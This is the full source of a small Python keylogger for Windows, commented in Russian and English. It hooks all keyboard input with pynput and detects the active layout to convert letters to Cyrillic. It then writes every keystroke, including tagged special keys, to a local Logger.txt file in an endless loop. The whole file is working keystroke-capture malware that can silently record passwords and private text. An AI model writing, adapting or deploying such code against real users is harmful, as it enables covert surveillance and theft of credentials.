from pynput import keyboard
import ctypes

# С помощью этого словаря мы сможем заменить английские буквы на русские / With the help of this dictionary we will
translation = str.maketrans(dict(zip(r"`qwertyuiop[]asdfghjkl;'zxcvbnm,.", r"ёйцукенгшщзхъфывапролджэячсмитьбю")))


# Эта функция показывает нам выбран русский язык, или нет / This function shows us whether the Russian language is
def get_layout():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    if lid_hex == "0x419":
        return "ru"


def get_char(key):
    # Если это буква / If it's a letter
    try:
        # если выбран русский язык, то автоматически заменяем английскую букву (а именно её нам сообщает модуль pynput) на русскую / if the Russian language is selected, then we automatically replace the English letter (namely, the pynput module tells us) to Russian
        if get_layout() == "ru":
            s1 = str(key.char).lower()
            return s1.translate(translation)
        # а иначе возвращаем просто букву
        return key.char
    # Это если окажется, что у нас какая-то специальная клавиша (Enter, Ctrl, Alt и т.д.) / This is if it turns out that we have some kind of special key (Enter, Ctrl, Alt, and so on)
    except AttributeError:
        if keyboard.Key.space == key:
            return " "
        elif keyboard.Key.shift_l == key:
            return " [SHIFT_left] "
        elif keyboard.Key.shift_r == key:
            return " [SHIFT_right] "
        elif keyboard.Key.enter == key:
            return " [ENTER] \n"
        elif keyboard.Key.alt_l == key:
            return " [ALT_left] "
        elif keyboard.Key.alt_gr == key:
            return " [ALT_right] "
        elif keyboard.Key.esc == key:
            return " [ESC] "
        elif keyboard.Key.tab == key:
            return " [TAB]    "
        elif keyboard.Key.up == key:
            return " [UP] "
        elif keyboard.Key.down == key:
            return " [DOWN] "
        elif keyboard.Key.left == key:
            return " [<LEFT] "
        elif keyboard.Key.right == key:
            return " [RIGHT>] "
        elif keyboard.Key.num_lock == key:
            return " [NUM_LOCK] "
        elif keyboard.Key.insert == key:
            return " [INSERT] "
        elif keyboard.Key.pause == key:
            return " [PAUSE] "
        elif keyboard.Key.print_screen == key:
            return " [PRINT_SCREEN] "
        elif keyboard.Key.caps_lock == key:
            return " [CAPS] "
        elif keyboard.Key.backspace == key:
            return " [BACKSPACE] "
        elif keyboard.Key.delete == key:
            return " [DELETE] "
        elif keyboard.Key.home == key:
            return " [HOME] "
        elif keyboard.Key.page_up == key:
            return " [PAGE_UP] "
        elif keyboard.Key.page_down == key:
            return " [PAGE_DOWN] "
        elif keyboard.Key.end == key:
            return " [END] "
        elif keyboard.Key.ctrl_l == key:
            return " [CTRL_left] "
        elif keyboard.Key.ctrl_r == key:
            return " [CTRL_right] "
        elif keyboard.Key.cmd == key:
            return " [WIN] "
        elif keyboard.Key.media_volume_mute == key:
            return " [VOLUME_MUTE] "
        elif keyboard.Key.media_volume_down == key:
            return " [VOLUME_DOWN] "
        elif keyboard.Key.media_volume_up == key:
            return " [VOLUME_UP] "
        return " " + str(key) + " "


# Функция выполняется тогда, когда мы нажимаем на клавишу / The function is executed when we press the key
def on_press(key):
    with open("Logger.txt", "a") as file:
        file.write(get_char(key))


# Начинаем считывать то, что нажимают на клавиатуру / We begin to read what is pressed on the keyboard
listen = keyboard.Listener(on_press=on_press)
listen.start()

# Чтобы код не выключался / So that the code does not turn off
while True:
    pass
